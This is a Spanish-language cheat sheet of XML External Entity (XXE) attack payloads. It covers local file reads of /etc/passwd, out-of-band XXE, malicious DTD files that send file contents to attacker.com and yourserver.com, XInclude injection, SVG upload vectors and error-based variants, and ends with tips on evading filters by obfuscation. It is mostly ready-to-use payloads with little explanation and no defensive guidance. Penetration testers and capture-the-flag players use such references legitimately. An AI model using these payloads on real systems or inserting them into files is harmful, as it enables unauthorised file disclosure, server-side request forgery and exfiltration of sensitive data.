---

### 💥 **XXE (XML External Entity) Attack Cheat Sheet** 💥

---

#### 📝 **¿Qué es XXE?**  
El ataque **XXE (XML External Entity)** aprovecha vulnerabilidades en el procesamiento de entidades XML en aplicaciones web.  
Permite al atacante:  
- 🗃️ **Leer archivos locales.**  
- 🌐 **Realizar solicitudes HTTP desde el servidor.**  
- 🛠️ **Realizar ataques SSRF, DoS o RCE.**  

---

## ⚙️ **Tipos de Entidades en XML**

| Tipo                   | Descripción                                                                     |
| ---------------------- | ------------------------------------------------------------------------------- |
| Genéricas              | Representan cualquier tipo de información dentro del XML.                       |
| Externas (XXE)         | Referencian recursos externos, como archivos locales o URLs.                    |
| Predefinidas           | Entidades comunes usadas en XML (&lt;, &gt;, &amp;).                            |
| Entidades Paramétricas | Utilizan el símbolo `%` y se declaran en el **DTD (Document Type Definition)**. |
|                        |                                                                                 |

---

## 📝 **Ejemplo de Estructura XML**
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- Declaración XML -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "mi entidad">]> <!-- DTD (Document Type Definition) -->

<root>
    <name>fran</name>
    <tel>5454545as</tel>
    <email>fran@fran.com</email>
    <password>fran123</password>
</root>
```

---

## 💣 **Normal XXE (Local File Disclosure)**

### 📂 **Payloads:**
```xml
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
```

---

## 🌐 **Out Of Band XXE (OOB)**
- Estas inyecciones son ciegas (blind), donde el servidor realiza solicitudes HTTP hacia un servidor externo.

### 📝 **Payloads:**
```xml
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "http://192.168.64.128/testXXE"> ]>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.64.128/malicious.dtd"> %xxe; ]>
```

---

## 💾 **Malicious DTD Files**

### 📝 **Malicious DTD 1 - Base64 Encoding:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?file=%file;'>">
%stack;
%exfil;
```

### 📝 **Malicious DTD 2 - Direct File Read:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY exfil SYSTEM 'http://attacker.com/?file=%file;'>">
%stack;
```

### 📝 **Malicious DTD 3 - Error-Based XXE:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; error SYSTEM 'file://idontexist/%file;'>">
```

---

## 🛑 **XInclude Injection**

### 📂 **Payloads:**
**XInclude Local File:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

**XInclude OOB:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="http://yourserver.com/?data=file:///etc/passwd" parse="text"/>
</foo>
```

---

## 🖼️ **XXE via Image File Upload**

### 📝 **Normal XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY file SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&file;</text>
</svg>
```

### 📝 **OOB XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % send SYSTEM "http://yourserver.com/?data=%file;">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&send;</text>
</svg>
```

---

## 🔍 **XXE by Repurposing Local DTD**

### 📝 **Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % myFile SYSTEM "file:///usr/share/xml/catalog"> %myFile; ]>
```

---

## 📝 **Consejos Útiles:**
- 📌 **Siempre invoca el nombre de la entidad dentro del XML para ejecutar el payload.**  
- 🚀 **Si el ataque falla, intenta eliminar el `%` o probar variantes de codificación.**  
- 🛑 **Si el servidor bloquea ciertas entidades, intenta ofuscar los caracteres.**  

---
